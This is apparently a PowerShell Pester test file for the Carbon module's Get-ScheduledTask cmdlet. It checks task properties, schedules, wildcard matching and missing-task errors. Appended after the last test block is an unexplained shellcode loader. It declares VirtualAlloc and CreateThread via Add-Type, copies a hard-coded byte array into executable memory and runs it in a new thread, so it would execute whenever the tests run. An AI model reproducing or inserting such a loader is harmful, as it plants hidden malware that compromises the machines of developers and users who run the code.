












& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

Describe 'Get-ScheduledTask' {
    function Assert-ScheduledTaskEqual
    {
        param(
            $Expected,
            $Actual
        )
        
        Write-Debug ('{0} <=> {1}' -f $Expected.TaskName,$Actual.TaskName)
        $randomNextRunTimeTasks = @{
                                        '\Microsoft\Office\Office 15 Subscription Heartbeat' = $true;
                                        '\OneDrive Standalone Update Task-S-1-5-21-1225507754-3068891322-2807220505-500' = $true;
                                    }
        $scheduleProps = @(
                               'Last Result',
                               'Stop Task If Runs X Hours And X Mins',
                               'Schedule',
                               'Schedule Type',
                               'Start Time',
                               'Start Date',
                               'End Date',
                               'Days',
                               'Months',
                               'Repeat: Every',
                               'Repeat: Until: Time',
                               'Repeat: Until: Duration',
                               'Repeat: Stop If Still Running'
                         )
    
        foreach( $property in (Get-Member -InputObject $Expected -MemberType NoteProperty) )
        {
            $columnName = $property.Name
            if( $scheduleProps -contains $columnName )
            {
                continue
            }
            
            $propertyName = $columnName -replace '[^A-Za-z0-9_]',''
    
            Write-Debug ('  {0} <=> {1}' -f $propertyName,$columnName)
            $failMsg = '{0}; column {1}; property {2}' -f $Actual.FullName,$columnName,$propertyName
            if( $propertyName -eq 'TaskName' )
            {
                $name = Split-Path -Leaf -Path $Expected.TaskName
                $path = Split-Path -Parent -Path $Expected.TaskName
                if( $path -ne '\' )
                {
                    $path = '{0}\' -f $path
                }
                $Actual.TaskName | Should -Be $name -Because ('{0}  TaskName' -f $task.FullName) 
                $Actual.TaskPath | Should -Be $path -Because ('{0}  TaskPath' -f $task.FullName)
            }
            elseif( $propertyName -in @( 'NextRunTime', 'LastRuntime' ) -and ($task.FullName -like '\Microsoft\Windows\*' -or $randomNextRunTimeTasks.ContainsKey($task.FullName)) )
            {
                
                continue
            }
            else
            {
                $because = '{0}  {1}' -f $task.FullName,$propertyName
                ($Actual | Get-Member -Name $propertyName) | Should -Not -BeNullOrEmpty -Because $because
                $expectedValue = $Expected.$columnName
                if( $propertyName -eq 'TaskToRun' )
                {
                    $expectedValue = $expectedValue.TrimEnd()

                    if( $expectedValue -like '*"*' )
                    {
                        $actualTask = Get-CScheduledTask -Name $Expected.TaskName -AsComObject
                        if( -not $actualTask.Xml )
                        {
                            Write-Error -Message ('COM object for task "{0}" doesn''t have an XML property or the property doesn''t have a value.' -f $Expected.TaskName)
                        }
                        else
                        {
                            Write-Debug -Message $actualTask.Xml
                            $taskxml = [xml]$actualTAsk.Xml
                            $task = $taskxml.Task
                            if( ($task | Get-Member -Name 'Actions') -and ($task.Actions | Get-Member -Name 'Exec') )
                            {
                                $expectedValue = $taskXml.Task.Actions.Exec.Command
                                if( ($taskxml.Task.Actions.Exec | Get-Member 'Arguments') -and  $taskXml.Task.Actions.Exec.Arguments )
                                {
                                    $expectedValue = '{0} {1}' -f $expectedValue,$taskxml.Task.Actions.Exec.Arguments
                                }
                            }
                        }
                    }
                }
                Write-Debug ('    {0} <=> {1}' -f $Actual.$propertyName,$expectedValue)
                ($Actual.$propertyName) | Should -Be $expectedValue -Because $because
            }
        }
    
    
    }

    BeforeEach {
        $Global:Error.Clear()
    }

    It 'should get each scheduled task' {
        schtasks /query /v /fo csv | 
            ConvertFrom-Csv | 
            Where-Object { $_.TaskName -and $_.HostName -ne 'HostName' } | 
            Where-Object { $_.TaskName -notlike '*Intel*' -and $_.TaskName -notlike '\Microsoft\*' } |  
            ForEach-Object {
                $expectedTask = $_
                $task = Get-ScheduledTask -Name $expectedTask.TaskName
                $task | Should Not BeNullOrEmpty
    
                Assert-ScheduledTaskEqual $expectedTask $task
            }
    }
    
    It 'should get schedules' {
        $multiScheduleTasks = Get-ScheduledTask | Where-Object { $_.Schedules.Count -gt 1 }
    
        $multiScheduleTasks | Should Not BeNullOrEmpty
    
        $taskProps = @(
                            'HostName',
                            'TaskName',
                            'Next Run Time',
                            'Status',
                            'Logon Mode',
                            'Last Run Time',
                            'Author',
                            'Task To Run',
                            'Start In',
                            'Comment',
                            'Scheduled Task State',
                            'Idle Time',
                            'Power Management',
                            'Run As User',
                            'Delete Task If Not Rescheduled'
                     )
        foreach( $multiScheduleTask in $multiScheduleTasks )
        {
            $expectedSchedules = schtasks /query /v /fo csv /tn $multiScheduleTask.FullName | ConvertFrom-Csv
            $scheduleIdx = 0
            foreach( $expectedSchedule in $expectedSchedules )
            {
                $actualSchedule = $multiScheduleTask.Schedules[$scheduleIdx++]
                $actualSchedule | Should BeOfType ([Carbon.TaskScheduler.ScheduleInfo])
            }
        }
    }

    It 'should support wildcards' {
        $expectedTask = Get-CScheduledTask -AsComObject | Select-Object -First 1
        $expectedTask | Should -Not -BeNullOrEmpty
        $wildcard = ('*{0}*' -f $expectedTask.Path.Substring(1,$expectedTask.Path.Length - 2))
        $task = Get-ScheduledTask -Name $wildcard
        $task | Should -Not -BeNullOrEmpty
        $task | Should -BeOfType ([Carbon.TaskScheduler.TaskInfo])
        Join-Path -Path $task.TaskPath -ChildPath $task.TaskName | Should Be $expectedTask.Path
    }
}

Describe 'Get-ScheduledTask.when getting all tasks' {
    It 'should get all scheduled tasks' {
        $expectedTasks = Get-CScheduledTask -AsComObject | Measure-Object
        $actualTasks = Get-ScheduledTask
        $actualTasks.Count | Should -Be $expectedTasks.Count
    }
    
}

Describe 'Get-ScheduledTask.when task does not exist' {
    $Global:Error.Clear()
    $result = Get-ScheduledTask -Name 'fjdskfjsdflkjdskfjsdklfjskadljfksdljfklsdjf' -ErrorAction SilentlyContinue
    It 'write no errors' {
        $Global:Error.Count | Should BeGreaterThan 0
        $Global:Error[0] | Should Match 'not found'
    }

    It 'should return nothing' {
        $result | Should BeNullOrEmpty
    }
}
    

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x0c,0x02,0x66,0x5d,0xd9,0xc8,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x51,0x31,0x6a,0x13,0x83,0xea,0xfc,0x03,0x6a,0x03,0xe0,0x93,0xa1,0xf3,0x66,0x5b,0x5a,0x03,0x07,0xd5,0xbf,0x32,0x07,0x81,0xb4,0x64,0xb7,0xc1,0x99,0x88,0x3c,0x87,0x09,0x1b,0x30,0x00,0x3d,0xac,0xff,0x76,0x70,0x2d,0x53,0x4a,0x13,0xad,0xae,0x9f,0xf3,0x8c,0x60,0xd2,0xf2,0xc9,0x9d,0x1f,0xa6,0x82,0xea,0xb2,0x57,0xa7,0xa7,0x0e,0xd3,0xfb,0x26,0x17,0x00,0x4b,0x48,0x36,0x97,0xc0,0x13,0x98,0x19,0x05,0x28,0x91,0x01,0x4a,0x15,0x6b,0xb9,0xb8,0xe1,0x6a,0x6b,0xf1,0x0a,0xc0,0x52,0x3e,0xf9,0x18,0x92,0xf8,0xe2,0x6e,0xea,0xfb,0x9f,0x68,0x29,0x86,0x7b,0xfc,0xaa,0x20,0x0f,0xa6,0x16,0xd1,0xdc,0x31,0xdc,0xdd,0xa9,0x36,0xba,0xc1,0x2c,0x9a,0xb0,0xfd,0xa5,0x1d,0x17,0x74,0xfd,0x39,0xb3,0xdd,0xa5,0x20,0xe2,0xbb,0x08,0x5c,0xf4,0x64,0xf4,0xf8,0x7e,0x88,0xe1,0x70,0xdd,0xc4,0x9b,0xef,0xaa,0x14,0x0c,0x87,0x3b,0x7a,0xa5,0x33,0xd4,0xce,0x42,0x9a,0x23,0x31,0x79,0xd3,0xf0,0x9e,0xd1,0x47,0x54,0x73,0xbe,0x5d,0x0c,0x0a,0x99,0x5d,0x65,0xbf,0xb6,0xcb,0x85,0x6c,0x6a,0x64,0x53,0x96,0x8c,0x74,0x8b,0xee,0x8c,0x74,0x4b,0x21,0xb8,0x41,0x08,0x7e,0xae,0xa9,0xde,0xe8,0x79,0x23,0x41,0x2e,0x7a,0xe6,0xf7,0x68,0xd6,0x61,0x08,0x76,0xb9,0xf5,0x5b,0x25,0x6a,0xa1,0x08,0x9f,0xe4,0xa6,0xfa,0x31,0xce,0xc7,0xd0,0xdb,0x5a,0x32,0x84,0xb0,0xc9,0x11,0x69,0x60,0x86,0xb8,0x8b,0x94,0x2d,0x3c,0x46,0x21,0x11,0xb7,0x63,0x66,0xe7,0xd5,0x1c,0x88,0xb2,0x84,0x8b,0x97,0x68,0xa2,0x73,0x0f,0x93,0x23,0x74,0xcf,0xfb,0x43,0x74,0x8f,0xfb,0x10,0x1c,0x57,0x58,0xc5,0x39,0x98,0x75,0x79,0x92,0x35,0xff,0x99,0x42,0xd1,0xff,0x45,0x6d,0x21,0x53,0xd0,0x05,0x33,0xc5,0x55,0x37,0xcc,0x3c,0xe0,0x78,0x46,0x72,0x60,0x7f,0xa7,0x4f,0xf2,0x40,0xd2,0xaa,0xa5,0x83,0x43,0xdd,0xdf,0xfb,0x84,0xe2,0xd1,0x31,0x4d,0x33,0x22,0x18,0x81,0x65,0x73,0x64;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

